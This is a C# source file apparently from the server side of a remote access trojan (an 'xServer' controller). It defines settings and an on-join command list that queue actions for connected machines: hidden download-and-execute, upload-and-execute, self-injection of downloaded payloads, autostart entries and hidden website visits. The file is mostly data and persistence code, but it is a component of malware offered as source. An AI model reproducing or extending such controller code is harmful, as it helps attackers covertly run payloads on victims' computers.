using System;
using System.Collections.Generic;
namespace xServer.Core.Misc
{
    public class Update
    {
        public static string DownloadURL { get; set; }
    }

    public class VisitWebsite
    {
        public static string URL { get; set; }
        public static bool Hidden { get; set; }
    }

    public class DownloadAndExecute
    {
        public static string URL { get; set; }
        public static bool RunHidden { get; set; }
        public static string Type { get; set; }
    }

    public class UploadAndExecute
    {
        public static string FilePath { get; set; }
        public static bool RunHidden { get; set; }
        public static string Type { get; set; }
    }

    public class AutostartItem
    {
        public static string Name { get; set; }
        public static string Path { get; set; }
        public static int Type { get; set; }
    }

    public class OnJoinCommands
    {
        public static List<Core.Misc.OnJoinCommand> MainList = new List<OnJoinCommand>();
        public static void LoadFromSettings()
        {
            if (xServer.Properties.Settings.Default.onJoin == null)
                xServer.Properties.Settings.Default.onJoin = "";
            if (xServer.Properties.Settings.Default.onJoin == "")
                return;
            string[] data = xServer.Properties.Settings.Default.onJoin.Split(new string[] { Environment.NewLine }, StringSplitOptions.None);

            foreach (string line in data)
            {
                OnJoinCommand cmd = null;
                string[] lineData = line.Split('|');
                switch (lineData[0])
                {
                    case "VisitURL":
                        cmd = new OnJoinCommand(JoinCommand.VisitURL, lineData[1]);
                        break;
                    case "DownloadDrop":
                        cmd = new OnJoinCommand(JoinCommand.DownloadDrop, lineData[1]);
                        break;
                    case "DownloadNative":
                        cmd = new OnJoinCommand(JoinCommand.DownloadNative, lineData[1]);
                        break;
                    case "DownloadSelfInject":
                        cmd = new OnJoinCommand(JoinCommand.DownloadSelfInject, lineData[1]);
                        break;
                    case "VisitURLHidden":
                        cmd = new OnJoinCommand(JoinCommand.VisitURLHidden, lineData[1]);
                        break;
                }
                if (cmd != null)
                    MainList.Add(cmd);
            }
        }
        public static void SaveToSettings()
        {
            List<string> lines = new List<string>();
            foreach (OnJoinCommand cmd in MainList)
            {
                string lineData = string.Format("{0}|{1}", cmd.Type.ToString(), cmd.Value.ToString());

                lines.Add(lineData);
            }

            string final = string.Join(Environment.NewLine, lines.ToArray());
            xServer.Properties.Settings.Default.onJoin = final;
            xServer.Properties.Settings.Default.Save();
        }
        public static Dictionary<string, string> ToDictionary()
        {
            Dictionary<string, string> ret = new Dictionary<string, string>();

            foreach (OnJoinCommand cmd in MainList)
            {
                ret.Add(cmd.Type.ToString(), cmd.Value.ToString());
            }
            return ret;
        }
        public static string[] ToArray()
        {
            List<string> lines = new List<string>();
            foreach (OnJoinCommand cmd in MainList)
            {
                string lineData = string.Format("{0}|{1}", cmd.Type.ToString(), cmd.Value.ToString());

                lines.Add(lineData);
            }
            return lines.ToArray();
        }
    }
}